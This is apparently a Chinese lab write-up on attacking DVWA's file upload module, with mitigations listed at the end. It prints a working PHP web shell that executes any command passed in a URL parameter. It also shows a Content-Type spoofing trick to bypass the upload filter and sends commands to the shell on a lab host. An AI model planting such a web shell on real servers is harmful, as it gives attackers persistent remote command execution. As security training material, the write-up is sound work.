## 一、Web Shell
- 绕过DVWA"Upload"模块的上传限制，上传一个恶意的PHP脚本(Web Shell)，且利用Web Shell在服务器上执行任意命令
## 二、攻击流程
### 2.1 payload制作
- kali桌面创建`shell.php`,意思是如果URL中有`cmd`的参数，就把这个参数的内容当成一个系统命令来执行，并把结果显示页面
```
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
    }
?>
```
### 2.2 渗透
- 打开Upload界面，设置代理，开启Burp Suite，开启拦截
- 上传`shell.php`
- Burp Suite中找到请求头中`Content-Type`行，因为上传的是PHP文件，类型是`application/x-php`，将其改成`image/jpeg`，再Forward
- 请求头内容：<img width="518" height="657" alt="image" src="https://github.com/user-attachments/assets/de4145bf-b0bb-4cd0-884b-d771e686e8d6" />
### 2.3 控制
- 访问后门：`http://192.168.174.130/dvwa/hackable/uploads/shell.php`
- 查看当前用户：`http://192.168.174.130/dvwa/hackable/uploads/shell.php?cmd=whoami`
- 列出当前目录文件：`http://192.168.174.130/dvwa/hackable/uploads/shell.php?cmd=ls -la`
## 三、总结
- 结果：<img width="697" height="93" alt="image" src="https://github.com/user-attachments/assets/d10341f5-6104-4984-9b40-06e89b1f9886" />
- 上传漏洞是最高危的漏洞之一：
   - 持久控制：之前的命令注入，只能执行一条命令，且还要绕过过滤，而上传一个Web Shell后，拥有一个持久化的后门
   - 权限提升：Web服务通常不用最高权限(root)运行，但一旦有了立足点(Web Shell)，就可以去寻找服务器上其他的系统漏洞，尝试把自己从一个普通用户(如`www-data`)提升为`root`管理员
   - 内网渗透：这台Web服务器可能只是公司网络的一台机器，是渗透的起点
   - 难以检测：服务器上看起来就是个普通文件/图片
- 防御策略：
   - 文件类型
   - 文件后缀检查(白名单策略)：规定“只许上传什么”。其他后缀拒绝，若黑名单，则会出现，如用`.php5`绕过对`.php`的禁用
   - 文件内容检查：检查文件头部的几个字节(魔术字节)，如一个JPEG图片文件，开头`FF D8 FF`，一个PHP文件，开头`<?php`，防止攻击者把一个`shell.php`改名为`shell.jpg`蒙混过关
   - 文件重命名：文件上传成功时，不用原始文件名，而是由服务器生成随机、无意义的文件名保存，如攻击者上传了`shell.php`，但服务器保存为`xzl.jpg`，若文件被访问，也只会被当问图片，里面的PHP代码不会被执行
   - 独立的、不可执行的存储位置：如网站代码在`/var/www/html`，上传的文件在`/var/uploads`，且Web服务器被明确配置为`/var/uploads`目录下的任何文件无法作为脚本执行
